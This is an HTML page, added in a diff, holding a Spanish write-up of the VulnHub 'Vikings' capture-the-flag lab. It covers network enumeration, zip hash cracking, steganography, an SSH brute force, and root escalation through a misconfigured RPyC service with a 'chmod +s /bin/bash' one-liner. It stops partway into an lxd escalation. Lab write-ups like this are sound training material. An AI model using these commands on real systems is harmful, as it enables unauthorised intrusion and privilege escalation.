@@ -1,1 +1,829 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>CTF Vikings - Write-up | Jose L. Trigo</title>
+  <meta name="description" content="Resolución completa del CTF Vikings de VulnHub: enumeración, explotación de SSH, esteganografía y escalada de privilegios." />
 
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Sans:ital,wght@0,300;0,400;0,600;1,400&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; }
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: "Fira Sans", sans-serif;
+      background: #020b14;
+      color: #cbd5dd;
+      -webkit-font-smoothing: antialiased;
+    }
+    a { color: #00a8ff; text-decoration: none; transition: color .2s; }
+    a:hover { color: #fff; text-decoration: none; }
+
+    .wrap {
+      max-width: 1280px;
+      margin: 28px auto;
+      padding: 24px;
+    }
+
+    /* --- HEADER FIJO (igual que el principal) --- */
+    .fixed-header {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background: #000D1F;
+      color: #e3edf7;
+      border-bottom: 1px solid #00a8ff;
+      z-index: 1000;
+      padding: .5rem 1.5rem;
+      box-shadow: 0 2px 20px rgba(0, 168, 255, .15);
+    }
+    .header-content {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      max-width: 1132px;
+      margin: 0 auto;
+    }
+    .logo-container {
+      display: flex;
+      align-items: center;
+    }
+    .logo-img {
+      height: 38px;
+      width: auto;
+      display: block;
+    }
+    .nav-list {
+      list-style: none;
+      display: flex;
+      gap: 12px;
+      padding: 0;
+      margin: 0;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+    .nav-item {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      padding: 6px 14px;
+      border-radius: 4px;
+      background: #020b14;
+      color: #00a8ff;
+      font-family: "JetBrains Mono", monospace;
+      font-weight: 700;
+      font-size: .85rem;
+      letter-spacing: .5px;
+      border: 1px solid rgba(0, 168, 255, .4);
+      box-shadow: 0 0 8px rgba(0, 168, 255, .05);
+      transition: all .2s ease;
+    }
+    .nav-item:hover {
+      transform: translateY(-1px);
+      box-shadow: 0 0 12px rgba(0, 168, 255, .3);
+      background: #051628;
+      color: #fff;
+      border-color: #00a8ff;
+    }
+    .nav-item.active {
+      background: #00a8ff;
+      color: #020b14;
+      border-color: #00a8ff;
+    }
+    body { padding-top: 70px; }
+
+    /* --- SECCIONES --- */
+    section {
+      margin-bottom: 32px;
+      background: #051628;
+      border: 1px solid rgba(0, 168, 255, .2);
+      border-radius: 8px;
+      padding: 24px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, .3);
+      scroll-margin-top: 90px;
+    }
+    h1 {
+      font-family: "JetBrains Mono", monospace;
+      font-weight: 700;
+      color: #e3edf7;
+      font-size: 2rem;
+      margin: 0 0 0.5rem 0;
+      border-left: 4px solid #00a8ff;
+      padding-left: 16px;
+    }
+    h2 {
+      font-family: "JetBrains Mono", monospace;
+      font-weight: 700;
+      color: #e3edf7;
+      font-size: 1.5rem;
+      margin: 1.5rem 0 0.75rem 0;
+      border-bottom: 1px solid rgba(0, 168, 255, .2);
+      padding-bottom: 0.5rem;
+    }
+    h3 {
+      font-family: "JetBrains Mono", monospace;
+      font-weight: 600;
+      color: #00a8ff;
+      font-size: 1.2rem;
+      margin: 1.2rem 0 0.5rem 0;
+      scroll-margin-top: 90px;
+    }
+    h4 {
+      font-family: "JetBrains Mono", monospace;
+      font-weight: 500;
+      color: #cbd5dd;
+      font-size: 1rem;
+      margin: 1rem 0 0.25rem 0;
+    }
+    p, li {
+      color: #cbd5dd;
+      line-height: 1.6;
+      font-size: 0.95rem;
+    }
+    .lead {
+      color: #4a75a0;
+      font-size: 1rem;
+      margin-bottom: 1.2rem;
+    }
+    .subhead {
+      color: #4a75a0;
+      font-size: 0.9rem;
+      margin-top: -0.2rem;
+      margin-bottom: 1.2rem;
+    }
+
+    /* --- BLOQUES DE TERMINAL --- */
+    .term-block {
+      background: #020b14;
+      border: 1px solid rgba(0, 168, 255, .2);
+      border-radius: 6px;
+      padding: 12px 16px;
+      margin: 12px 0;
+      overflow-x: auto;
+      font-family: "JetBrains Mono", ui-monospace, monospace;
+      font-size: 0.85rem;
+      line-height: 1.6;
+      color: #cbd5dd;
+    }
+    .term-block .prompt {
+      color: #00a8ff;
+      font-weight: 700;
+    }
+    .term-block .output {
+      color: #e3edf7;
+    }
+    .term-block .comment {
+      color: #4a75a0;
+      font-style: italic;
+    }
+    .term-block .highlight {
+      color: #ffbd2e;
+    }
+
+    /* --- IMÁGENES --- */
+    figure {
+      margin: 20px 0;
+      text-align: center;
+    }
+    figure img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 6px;
+      border: 1px solid rgba(0, 168, 255, .15);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, .4);
+    }
+    figcaption {
+      color: #4a75a0;
+      font-size: 0.8rem;
+      margin-top: 6px;
+      font-family: "JetBrains Mono", monospace;
+    }
+
+    /* --- TABLAS --- */
+    .table-wrap {
+      overflow-x: auto;
+      margin: 16px 0;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.9rem;
+      background: #020b14;
+      border-radius: 6px;
+      border: 1px solid rgba(0, 168, 255, .15);
+    }
+    th, td {
+      padding: 10px 14px;
+      text-align: left;
+      border-bottom: 1px solid rgba(0, 168, 255, .1);
+    }
+    th {
+      color: #00a8ff;
+      font-weight: 700;
+      font-family: "JetBrains Mono", monospace;
+      background: #051628;
+    }
+    td {
+      color: #cbd5dd;
+    }
+    tr:last-child td {
+      border-bottom: none;
+    }
+    /* Para tablas sin cabecera, usamos solo td en negrita si queremos */
+    .table-plain td:first-child {
+      font-weight: 600;
+      color: #e3edf7;
+    }
+
+    /* --- LISTAS --- */
+    ul, ol {
+      padding-left: 1.5rem;
+      color: #cbd5dd;
+    }
+    li {
+      margin-bottom: 0.3rem;
+    }
+
+    /* --- BOTÓN DE VOLVER --- */
+    .btn-back {
+      display: inline-block;
+      background: transparent;
+      border: 1px solid rgba(0, 168, 255, .4);
+      color: #00a8ff;
+      padding: 6px 16px;
+      border-radius: 4px;
+      font-family: "JetBrains Mono", monospace;
+      font-size: 0.8rem;
+      font-weight: 700;
+      transition: all 0.3s;
+      text-decoration: none;
+    }
+    .btn-back:hover {
+      background: #00a8ff;
+      color: #020b14;
+      border-color: #00a8ff;
+      box-shadow: 0 0 15px rgba(0, 168, 255, .3);
+    }
+
+    /* --- FOOTER --- */
+    footer {
+      padding: 20px;
+      margin-top: 12px;
+      border-top: 1px solid rgba(0, 168, 255, .15);
+      color: #4a75a0;
+      text-align: center;
+      font-size: .85rem;
+      font-family: "JetBrains Mono", monospace;
+    }
+
+    /* --- INDICE --- */
+    .indice {
+      background: #020b14;
+      border: 1px solid rgba(0, 168, 255, .15);
+      border-radius: 6px;
+      padding: 16px 20px;
+      margin: 16px 0 24px 0;
+    }
+    .indice p {
+      margin: 0 0 8px 0;
+      font-weight: 600;
+      color: #4a75a0;
+      font-size: 0.9rem;
+      letter-spacing: 0.5px;
+    }
+    .indice ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px 20px;
+    }
+    .indice li {
+      margin: 0;
+    }
+    .indice a {
+      color: #00a8ff;
+      font-family: "JetBrains Mono", monospace;
+      font-size: 0.85rem;
+      font-weight: 500;
+      transition: color .2s, border-color .2s;
+      border-bottom: 1px solid transparent;
+      padding-bottom: 2px;
+    }
+    .indice a:hover {
+      color: #fff;
+      border-bottom-color: #00a8ff;
+    }
+
+    /* --- RESPONSIVE --- */
+    @media (max-width: 720px) {
+      .header-content { flex-direction: column; gap: 10px; }
+      body { padding-top: 110px; }
+      .nav-item { padding: 6px 10px; font-size: .75rem; }
+      h1 { font-size: 1.6rem; }
+      .indice ul { gap: 6px 12px; }
+      .indice a { font-size: 0.75rem; }
+    }
+    @media (max-width: 480px) {
+      .wrap { padding: 12px; }
+      section { padding: 16px; }
+      .term-block { font-size: 0.75rem; padding: 10px; }
+      .indice { padding: 12px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER FIJO (igual que el principal, enlazando a la raíz) -->
+  <header class="fixed-header">
+    <div class="header-content">
+      <span class="logo-container">
+        <a href="../../index.html">
+          <img src="../../imagenes/logo.png" alt="Logo JT" class="logo-img" />
+        </a>
+      </span>
+      <nav class="header-nav" aria-label="Navegación principal">
+        <ul class="nav-list">
+          <li><a class="nav-item" href="../../index.html#proyectos">Proyectos</a></li>
+          <li><a class="nav-item" href="../../herramientas/index.html">Herramientas</a></li>
+          <li><a class="nav-item" href="../../index.html#contacto">Contacto</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <div class="wrap">
+
+    <!-- ENCABEZADO DEL POST  -->
+    <div style="background:#051628; border:1px solid rgba(0,168,255,.2); border-radius:8px; padding:24px; margin-bottom:24px;">
+      <div style="display:flex; flex-wrap:wrap; gap:20px; align-items:center;">
+        <div style="flex:1; min-width:260px;">
+          <h1 style="border-left:none; padding-left:0; margin:0;">CTF: Vikings (VulnHub)</h1>
+          <p style="color:#4a75a0; margin:4px 0 8px;">Write‑up completo · José Luis Trigo Calvo</p>
+          <div style="display:flex; flex-wrap:wrap; gap:12px; margin-top:8px;">
+            <span style="background:#020b14; padding:4px 14px; border-radius:20px; border:1px solid rgba(0,168,255,.2); color:#00a8ff; font-family:'JetBrains Mono'; font-size:0.75rem;">#SSH</span>
+            <span style="background:#020b14; padding:4px 14px; border-radius:20px; border:1px solid rgba(0,168,255,.2); color:#00a8ff; font-family:'JetBrains Mono'; font-size:0.75rem;">#Esteganografía</span>
+            <span style="background:#020b14; padding:4px 14px; border-radius:20px; border:1px solid rgba(0,168,255,.2); color:#00a8ff; font-family:'JetBrains Mono'; font-size:0.75rem;">#RPyC</span>
+          </div>
+        </div>
+        <div style="flex:0 0 180px; display:flex; justify-content:center;">
+          <img src="../../imagenes/vikings_ctf.png" alt="Vikings CTF" style="max-width:180px; border-radius:6px; border:1px solid rgba(0,168,255,.3);" />
+        </div>
+      </div>
+      <!-- Datos del autor en tabla -->
+      <div style="margin-top:20px; border-top:1px solid rgba(0,168,255,.1); padding-top:16px;">
+        <table style="width:auto; background:transparent; border:none; font-size:0.9rem;">
+          <tr><td style="padding:4px 12px 4px 0; border:none; color:#4a75a0;">Autor</td><td style="padding:4px 0; border:none; color:#e3edf7;">José Luis Trigo Calvo</td></tr>
+          <tr><td style="padding:4px 12px 4px 0; border:none; color:#4a75a0;">LinkedIn</td><td style="padding:4px 0; border:none;"><a href="https://linkedin.com/in/jltrigoc/" target="_blank">linkedin.com/in/jltrigoc/</a></td></tr>
+          <tr><td style="padding:4px 12px 4px 0; border:none; color:#4a75a0;">Web</td><td style="padding:4px 0; border:none;"><a href="https://joseltc.github.io/" target="_blank">joseltc.github.io/</a></td></tr>
+          <tr><td style="padding:4px 12px 4px 0; border:none; color:#4a75a0;">Email</td><td style="padding:4px 0; border:none;"><a href="mailto:jltrigoc01@gmail.com">jltrigoc01@gmail.com</a></td></tr>
+        </table>
+      </div>
+    </div>
+
+    <!-- DECLARACIÓN DE USO ÉTICO -->
+    <section style="margin-bottom:24px;">
+      <h2>Declaración de uso ético</h2>
+      <p>El contenido de este documento refleja el proceso de resolución de un CTF (Capture The Flag) con fines estrictamente educativos. Todas las herramientas y comandos empleados se han utilizado en un entorno controlado y autorizado, como parte de mi formación como ethical hacker. No se ha realizado ninguna actividad ilícita ni se ha atacado ningún sistema real sin consentimiento. El único propósito de este trabajo es el aprendizaje y la mejora de las habilidades en ciberseguridad.</p>
+    </section>
+
+    <!-- MÁQUINAS UTILIZADAS -->
+    <section style="margin-bottom:24px;">
+      <h2>Máquinas utilizadas</h2>
+      <ul>
+        <li><strong>Kali Linux</strong> : <a href="https://www.kali.org/get-kali/#kali-virtual-machines" target="_blank">https://www.kali.org/get-kali/#kali-virtual-machines</a></li>
+        <li><strong>CTF Vikings</strong> : <a href="https://www.vulnhub.com/entry/vikings-1,741/" target="_blank">https://www.vulnhub.com/entry/vikings-1,741/</a></li>
+      </ul>
+    </section>
+
+    <!-- RESOLUCIÓN PASO A PASO -->
+    <section>
+      <h2>RESOLUCIÓN PASO A PASO</h2>
+
+      <!-- ÍNDICE DE CONTENIDO -->
+      <div class="indice">
+        <p>📑 Índice</p>
+        <ul>
+          <li><a href="#reconocimiento">1. Reconocimiento</a></li>
+          <li><a href="#enumeracion">2. Enumeración Web</a></li>
+          <li><a href="#explotacion">3. Explotación de SSH</a></li>
+          <li><a href="#escalada">4. Escalada de privilegios</a></li>
+          <li><a href="#resultados">5. Resultados</a></li>
+        </ul>
+      </div>
+
+      <!-- 1. Reconocimiento -->
+      <h3 id="reconocimiento">1.- Reconocimiento de máquinas</h3>
+      <p>Ambas máquinas se encuentran dentro de una misma interfaz de red.</p>
+      <p>Con el comando ip a comprobamos la IP que ha sido asignada a nuestra máquina Kali Linux. ( IP Kali Linux -&gt; 192.168.56.101)</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> ip a
+      </div>
+      <p>Con el comando <strong>sudo nmap -sn 192.168.56.0/24</strong> buscamos la IP de nuestra máquina MR Robot.</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> sudo nmap -sn 192.168.56.0/24
+      </div>
+      <figure>
+        <img src="imagenes/image2.png" alt="Resultado del escaneo de red con nmap" />
+        <figcaption>Escaneo de red: IP de Vikings = 192.168.56.105</figcaption>
+      </figure>
+      <p>Ahora procederemos a escanear la máquina Vikings más a fondo para saber los servicios que está prestando y en que puertos.</p>
+      <p>Para ello utilizaremos el comando <strong>nmap -sV 192.168.56.105</strong></p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> nmap -sV 192.168.56.105
+      </div>
+      <figure>
+        <img src="imagenes/image3.png" alt="Escaneo de puertos con nmap -sV" />
+        <figcaption>Puertos abiertos: 22 (ssh), 80 (http)</figcaption>
+      </figure>
+      <p>Como podemos ver obtenemos que la máquina tiene abiertos los siguientes puertos y está ofreciendo los siguientes servicios:</p>
+      <div class="table-wrap">
+        <table class="table-plain">
+          <tbody>
+            <tr><td>Puerto 22</td><td>ssh</td></tr>
+            <tr><td>Puerto 80</td><td>Apache / http</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>Como vemos que en el puerto 80 hay un servidor Apache con un servidor web.Si introducimos la dirección IP de nuestra maquina Vikings podemos ver un directorio index con una carpeta llamada /site .Vamos a investigar la página para ver si encontramos alguna pista.</p>
+      <figure>
+        <img src="imagenes/image4.png" alt="Directorio index con carpeta /site" />
+        <figcaption>Directorio index con carpeta /site</figcaption>
+      </figure>
+      <p>Al entrar en el directorio encontramos una página con una foto de uno de los protagonistas de la serie Vikingos y un texto descriptivo.</p>
+      <figure>
+        <img src="imagenes/image5.png" alt="Página principal de /site" />
+        <figcaption>Página principal de /site</figcaption>
+      </figure>
+
+      <!-- 2. Enumeración Web -->
+      <h3 id="enumeracion">2.-Enumeración Web</h3>
+      <p>Ahora que ya sabemos que hay un servidor web , vamos a realizar un escaneo de enumeración web que usa Nmap para descubrir directorios y archivos ocultos en servidores web.</p>
+      <p>Utilizaremos el comando <strong>nmap --script=http-enum.nse -p 80 192.168.56.102 y</strong></p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> nmap --script=http-enum.nse -p 80 192.168.56.102
+      </div>
+      <figure>
+        <img src="imagenes/image6.png" alt="Resultado del script http-enum de Nmap" />
+        <figcaption>Enumeración con Nmap</figcaption>
+      </figure>
+      <p><strong>gobuster dir -u http://192.168.56.105 -w /usr/share/wordlists/dirb/common.txt</strong></p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> gobuster dir -u http://192.168.56.105 -w /usr/share/wordlists/dirb/common.txt
+      </div>
+      <figure>
+        <img src="imagenes/image7.png" alt="Resultado de gobuster" />
+        <figcaption>Directorio descubiertos con gobuster</figcaption>
+      </figure>
+      <p>Ninguno de los dos comandos nos da ninguna información que no sepamos con antelación, pues únicamente nos indica la existencia del directorio /site .</p>
+      <p>De igual forma hemos utilizado el comando nikto -h 192.168.56.105 y hemos obtenido la misma información.</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> nikto -h 192.168.56.105
+      </div>
+      <p>Los comandos que muestran los archivos de una web no siempre muestran todas las rutas en su totalidad, por eso es interesante utilizar alguna herramienta más para ver si hemos detectado todos los directorios de la página.</p>
+      <p>Para ello hemos utilizado la herramienta gobuster ( pero aplicada directamente al directorio /site) y el siguiente comando <strong>gobuster dir -u http://192.168.56.105/site/ -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt,zip</strong> , en el que especificamos algunos de los tipos de archivo que nos puede interesar encontrar.</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> gobuster dir -u http://192.168.56.105/site/ -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt,zip
+      </div>
+      <figure>
+        <img src="imagenes/image8.png" alt="Gobuster sobre /site" />
+        <figcaption>Gobuster sobre /site</figcaption>
+      </figure>
+      <p>Con este comando hemos encontrado algunos directorios más que se encuentran dentro del directorio /site ( css, images,js) y un archivo txt llamado <strong>war.txt</strong> que nos puede ser de utilidad.</p>
+      <p>Vamos a investigar los resultados obtenidos.</p>
+      <p>La consulta del archivo war.txt ha sido todo un logro, pues nos muestra que hay otro directorio oculto<strong>(/war-is-over</strong>):</p>
+      <figure>
+        <img src="imagenes/image9.png" alt="Contenido de war.txt" />
+        <figcaption>war.txt muestra el directorio /war-is-over</figcaption>
+      </figure>
+      <p>Este directorio contiene un código ininteligible que probablemente se encuentre codificado. Si comprobamos el final de la infinidad de líneas que contiene el código podemos ver que el código termina con un = ( lo que puede ser un indicio de que esté codificado en base64)</p>
+      <figure>
+        <img src="imagenes/image10.png" alt="Código en /war-is-over" />
+        <figcaption>Código en /war-is-over</figcaption>
+      </figure>
+      <p>Vamos a descargar el archivo con <strong>curl -s http://192.168.56.105/site/war-is-over/ > hint</strong>. Con el comando <strong>file hint</strong> comprobamos que el texto que hay dentro del archivo está codificado en base64. Con el comando <strong>cat hint | base64 -d > pista</strong> revertimos la codificación y comprobamos que hemos obtenido un archivo .zip.</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> curl -s http://192.168.56.105/site/war-is-over/ > hint
+      </div>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> file hint
+      </div>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> cat hint | base64 -d > pista
+      </div>
+      <p>Cuando intentamos descomprimir el archivo nos pide una contraseña y nos indica que unzip necesita otra versión. Entonces utilizaremos 7z para descomprimir.</p>
+      <figure>
+        <img src="imagenes/image11.png" alt="Intento de descompresión con 7z" />
+        <figcaption>Descompresión con 7z</figcaption>
+      </figure>
+      <p>Con <strong>zip2john pista.zip > archivo</strong> obtenemos el hash del archivo para intentar obtener la contraseña que se nos está solicitando para descomprimir el archivo.</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> zip2john pista.zip > archivo
+      </div>
+      <p>Los programas de fuerza bruta como zip2john no pueden entender el formato complejo de un archivo .zip directamente. zip2john es una herramienta de traducción que toma el candado del archivo ZIP y lo extrae en un formato de texto plano que John sí puede procesar.</p>
+      <p>Ahora procesamos el archivo con john - - show archivo y comprobamos que el fichero se llama King y la contraseña es ragnarok123.</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> john --show archivo
+      </div>
+      <figure>
+        <img src="imagenes/image12.png" alt="Resultado de john" />
+        <figcaption>Resultado de john</figcaption>
+      </figure>
+      <p>Con <strong>7z x pista.zip</strong> extraemos el archivo y vemos que, efectivamente ,el archivo se llama King y es una imagen JPEG.</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> 7z x pista.zip
+      </div>
+      <figure>
+        <img src="imagenes/image13.png" alt="Extracción de King.jpg" />
+        <figcaption>Extracción de King.jpg</figcaption>
+      </figure>
+      <p>Vamos a utilizar una serie de comandos para intentar obtener información que puede contener la foto.</p>
+      <p>Con el comando <strong>exiftool</strong> podemos ver los metadatos de la imagen y, sin haber perdido la perspectiva de que la máquina atacada tiene ssh, nos damos cuenta que la imagen puede contener el nombre de algún usuario y una serie de contraseñas que podemos utilizar para intentar hacer un ataque de fuerza bruta.</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> exiftool King
+      </div>
+      <figure>
+        <img src="imagenes/image14.png" alt="Metadatos de King.jpg" />
+        <figcaption>Metadatos de King.jpg</figcaption>
+      </figure>
+      <p>Con vlastas y viking021 haremos un archivo de users.txt y con la lista de palabras que hay en keywords haremos un archivo de diccionario.txt con el fin de intentar hacer un ataque con hydra al SSH. Usaremos el comando <strong>hydra -L users.txt -P diccionario.txt -t 4 -v ssh://192.168.56.105</strong></p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> hydra -L users.txt -P diccionario.txt -t 4 -v ssh://192.168.56.105
+      </div>
+      <figure>
+        <img src="imagenes/image15.png" alt="Ataque de hydra sin éxito" />
+        <figcaption>Hydra sin éxito</figcaption>
+      </figure>
+      <p>No hemos obtenido ningún resultado. Habrá que explorar otras vías.</p>
+      <p>Ahora vamos a utilizar dos comandos que sirven para descubrir si se está haciendo esteganografía con la imagen, es decir, que se esté ocultando algo dentro de la imagen.</p>
+      <p>Con <strong>steghide info King</strong> no obtenemos ninguna información adicional pero con el comando <strong>binwalk -e King - -run-as = root</strong> podemos ver que se ha extraído un archivo . Comprobaremos el archivo <strong>_king.extracted</strong> que hemos obtenido.</p>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> steghide info King
+      </div>
+      <div class="term-block">
+        <span class="prompt">Joseltc@kali:~$</span> binwalk -e King --run-as=root
+      </div>
+      <figure>
+        <img src="imagenes/image16.png" alt="Resultado de binwalk" />
+        <figcaption>Resultado de binwalk</figcaption>
+      </figure>
+      <p>Consultado el directorio podemos ver que dentro hay un archivo user que contiene un posible usuario y contraseña y un archivo .zip.</p>
+      <figure>
+        <img src="imagenes/image17.png" alt="Contenido de _king.extracted" />
+        <figcaption>Contenido de _king.extracted</figcaption>
+      </figure>
+
+      <!-- 3. Explotación de SSH -->
+      <h3 id="explotacion">3.-Explotación de SSH</h3>
+      <p>Ahora que ya tenemos un posible usuario y contraseña vamos a intentar acceder por SSH a la máquina Vikings.</p>
+      <p>Probaremos : ssh FamousBoatbuilder_floki@192.168.56.105 o ssh floki@192.168.56.105 junto con la contraseña: f@m0usboatbuilde7.</p>
+      <p>Finalmente las credenciales son las siguientes:</p>
+      <div class="table-wrap">
+        <table class="table-plain">
+          <tbody>
+            <tr><td>User</td><td>Floki</td></tr>
+            <tr><td>Password</td><td>f@m0usboatbuilde7</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <figure>
+        <img src="imagenes/image18.png" alt="Acceso SSH" />
+        <figcaption>Acceso SSH</figcaption>
+      </figure>
+      <p>Ahora que ya estamos dentro de la máquina atacada vamos a investigar.</p>
+      <p>Podemos ver que estamos en el home del usuario floki y hay dos archivos interesantes que podemos consultar</p>
+      <figure>
+        <img src="imagenes/image19.png" alt="Archivos en /home/floki" />
+        <figcaption>Archivos en /home/floki</figcaption>
+      </figure>
+      <p>Leyendo ambos archivos podemos encontrar alguna pista, pero no son muy aclaratorias. En el readme.txt se habla de Ragnar, vamos a ver que usuarios hay en el sistema.</p>
+      <div class="term-block">
+        <span class="prompt">$</span> cat /etc/passwd | grep /bin/bash
+      </div>
+      <figure>
+        <img src="imagenes/image20.png" alt="Usuarios del sistema" />
+        <figcaption>Usuarios del sistema</figcaption>
+      </figure>
+      <p>Podemos ver que también existe el directorio del usuario Ragnar.</p>
+      <div class="term-block">
+        <span class="prompt">$</span> ls -la /home/ragnar
+      </div>
+      <figure>
+        <img src="imagenes/image21.png" alt="Contenido de /home/ragnar" />
+        <figcaption>Contenido de /home/ragnar</figcaption>
+      </figure>
+      <p>Dentro hay un fichero llamado user.txt que contiene la primera flag del CTF.</p>
+      <div class="term-block">
+        <span class="prompt">$</span> cat /home/ragnar/user.txt
+      </div>
+      <figure>
+        <img src="imagenes/image22.png" alt="user.txt con la primera flag" />
+        <figcaption>Primera flag encontrada</figcaption>
+      </figure>
+      <div class="term-block" style="border-color:#00a8ff;">
+        <span class="highlight">Key 1 -> 4bf930187d0149a9e4374a4e823f867d</span>
+      </div>
+      <p>Vamos a volver a la pista que encontramos en el directorio de floki, que hablaba sobre el teorema de Collatz y que posiblemente nos sirve para obtener la contraseña del usuario Ragnar.</p>
+      <figure>
+        <img src="imagenes/image23.png" alt="Pista sobre Collatz" />
+        <figcaption>Pista sobre Collatz</figcaption>
+      </figure>
+      <p>Utilizaremos un código en Python con el que intentaremos obtener la contraseña.</p>
+      <figure>
+        <img src="imagenes/image24.png" alt="Código Python de Collatz" />
+        <figcaption>Código Python de Collatz</figcaption>
+      </figure>
+      <p>Ejecutandolo con <strong>python3 collatz.py</strong> obtenemos lo siguiente:</p>
+      <div class="term-block">
+        <span class="prompt">$</span> python3 collatz.py
+      </div>
+      <figure>
+        <img src="imagenes/image25.png" alt="Resultado del script Collatz" />
+        <figcaption>Resultado del script Collatz</figcaption>
+      </figure>
+      <div class="table-wrap">
+        <table class="table-plain">
+          <tbody>
+            <tr><td>User</td><td>ragnar</td></tr>
+            <tr><td>Password</td><td>mR)|>^/Gky[gz=\.F#j5P(</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <p>Y como podemos ver ya se puede acceder con el usuario Ragnar y leer sus archivos.</p>
+      <figure>
+        <img src="imagenes/image26.png" alt="Acceso con usuario Ragnar" />
+        <figcaption>Acceso con usuario Ragnar</figcaption>
+      </figure>
+
+      <!-- 4. Escalada -->
+      <h3 id="escalada">4.- Escalada de privilegios</h3>
+
+      <h4>Primera forma</h4>
+      <p>Leyendo <strong>el archivo .profile</strong> de Ragnar encontramos lo siguiente:</p>
+      <figure>
+        <img src="imagenes/image27.png" alt="Contenido de .profile" />
+        <figcaption>Contenido de .profile</figcaption>
+      </figure>
+      <p>El archivo nos indica que ejecutando <strong>sudo python3 /usr/local/bin/rpyc_classic.py</strong> levantamos el servicio RPyC</p>
+      <p>¿Qué importancia tiene esto?</p>
+      <p>Pues vamos a comprobar si es root el usuario que se encarga de ejecutar rpyc.</p>
+      <p>Con el comando <strong>ps aux | grep</strong> <strong>rpyc</strong> podemos ver que es el usuario root el encargado de ejecutar este proceso. Vamos a aprovechar este proceso mal configurado para escalar los privilegios.</p>
+      <div class="term-block">
+        <span class="prompt">$</span> ps aux | grep rpyc
+      </div>
+      <figure>
+        <img src="imagenes/image28.png" alt="Proceso rpyc ejecutándose como root" />
+        <figcaption>Proceso rpyc ejecutándose como root</figcaption>
+      </figure>
+      <p>Desde una Shell con el usuario Ragnar logueado vamos a ejecutar el siguiente comando :</p>
+      <div class="term-block">
+        <span class="prompt">$</span> python3 -c 'import rpyc; c = rpyc.classic.connect("127.0.0.1", port=18812); c.modules.os.system("chmod +s /bin/bash")'
+      </div>
+      <p>Este comando explota un servicio RPyC mal configurado que se ejecuta con privilegios de administrador, utilizando la librería rpyc para conectarse localmente al puerto 18812. A través de esta conexión, el atacante invoca el módulo os del sistema para ejecutar el comando chmod +s /bin/bash, el cual asigna el bit SUID al intérprete de comandos; esto permite que cualquier usuario pueda ejecutar bash con los privilegios de root, logrando así una escalada de privilegios inmediata</p>
+      <figure>
+        <img src="imagenes/image29.png" alt="Ejecución del comando RPyC" />
+        <figcaption>Ejecución del comando RPyC</figcaption>
+      </figure>
+      <p>Con el comando <strong>/bin/bash -p</strong> abrimos una nueva terminal dentro y al comprobar el usuario que somos con <strong>whoami</strong> podemos ver que somos <strong>root.</strong></p>
+      <div class="term-block">
+        <span class="prompt">$</span> /bin/bash -p
+      </div>
+      <div class="term-block">
+        <span class="prompt">#</span> whoami
+      </div>
+      <p>Navegando por los directorios de la máquina ya podemos acceder a la carpeta root y encontramos la segunda key dentro de un fichero llamado root.txt:</p>
+      <div class="term-block">
+        <span class="prompt">#</span> cat /root/root.txt
+      </div>
+      <figure>
+        <img src="imagenes/image30.png" alt="root.txt con la segunda flag" />
+        <figcaption>Segunda flag encontrada</figcaption>
+      </figure>
+      <div class="term-block" style="border-color:#00a8ff;">
+        <span class="highlight">Key 2: f0b98d4387ff6da77317e582da98bf31</span>
+      </div>
+
+      <h4>Segunda forma</h4>
+      <p>Revisando los grupos del usuario floki nos encontramos con una vía para poder escalar privilegios, y es el grupo lxd.</p>
+      <div class="term-block">
+        <span class="prompt">$</span> groups floki
+      </div>
+      <figure>
+        <img src="imagenes/image31.png" alt="Grupo lxd de floki" />
+        <figcaption>Grupo lxd de floki</figcaption>
+      </figure>
+      <p>El grupo lxd permite que un usuario no privilegiado gestione contenedores de sistema. La vulnerabilidad reside en que, al configurar un nuevo contenedor, puedes montar el sistema de archivos del host (la máquina víctima) dentro del contenedor.</p>
+      <p>Con el comando <strong>searchsploit lxd</strong> podemos ver la vulnerabilidad sigue activa.</p>
+      <div class="term-block">
+        <span class="prompt">$</span> searchsploit lxd
+      </div>
+      <figure>
+        <img src="imagenes/image32.png" alt="Resultado de searchsploit lxd" />
+        <figcaption>Resultado de searchsploit lxd</figcaption>
+      </figure>
